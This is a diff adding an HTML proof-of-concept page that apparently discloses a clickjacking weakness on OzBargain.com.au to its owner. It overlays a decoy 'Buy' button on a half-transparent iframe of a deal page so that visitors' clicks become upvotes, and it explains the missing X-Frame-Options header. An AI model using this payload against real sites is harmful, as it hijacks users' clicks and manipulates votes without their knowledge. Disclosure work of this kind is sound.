@@ -1,0 +1,62 @@
+<html>
+<head>
+ 
+<!-- @infosec_au -->
+<style type="text/css">
+/* clickjacking style sheet constructed via owsap wiki */
+body {
+	margin: 0;
+	padding: 0;
+}
+iframe {
+	height: 300px;
+	width: 100px;
+	position: absolute;
+	left: 405;
+	bottom: 280;
+	z-index: 2;
+	opacity: 0.5;				
+	filter: alpha(opacity=0.5);
+}
+#placeholder {
+	width: 100px;
+	height: 100px;
+	position: absolute;
+	bottom: 335;
+	left: 270;
+	z-index: 1;
+}
+#button {
+	width: 35px;
+	height: 15px;
+	background-color: green;
+	color: white;
+	border: 4px solid black;
+	text-align: center;
+	line-height: 25px;
+	position: absolute;
+	left: 155px;
+	top: 65px;
+}
+#text {
+	width: 400px;
+	height: 50px;
+	position: absolute;
+	left: 130px;
+	top: 20px;
+}
+</style>
+</head>
+<body>
+<p>Hey Scott, this is just a PoC for Clickjacking on OzBargain.com.au. This shows how suppose, a deal poster could be manipulating ozbargain users to gain upvotes, by hijacking their clicks to upvote their post. This clickjacking is possible since X-Frame-Options are not set on the server to be Deny or SAMEORIGIN, allowing for ozbargain pages to be iframed. You can read more about clickjacking and mitigations of it <a href="https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet">here.</a> Note: the location of the iframe will depend on browser, as this is just a PoC, I have left the iframe opacity as 0.5. An attacker would make this 0.0.</p>
+<iframe src="http://www.ozbargain.com.au/node/120089"></iframe>
+<div id="placeholder">
+<div id="text">
+Buy GTA 5 for $20 @ someshiftywebsite.com
+</div>
+<div id="button">
+<b>Buy</b>
+</div>
+</div>
+</body>
+</html>
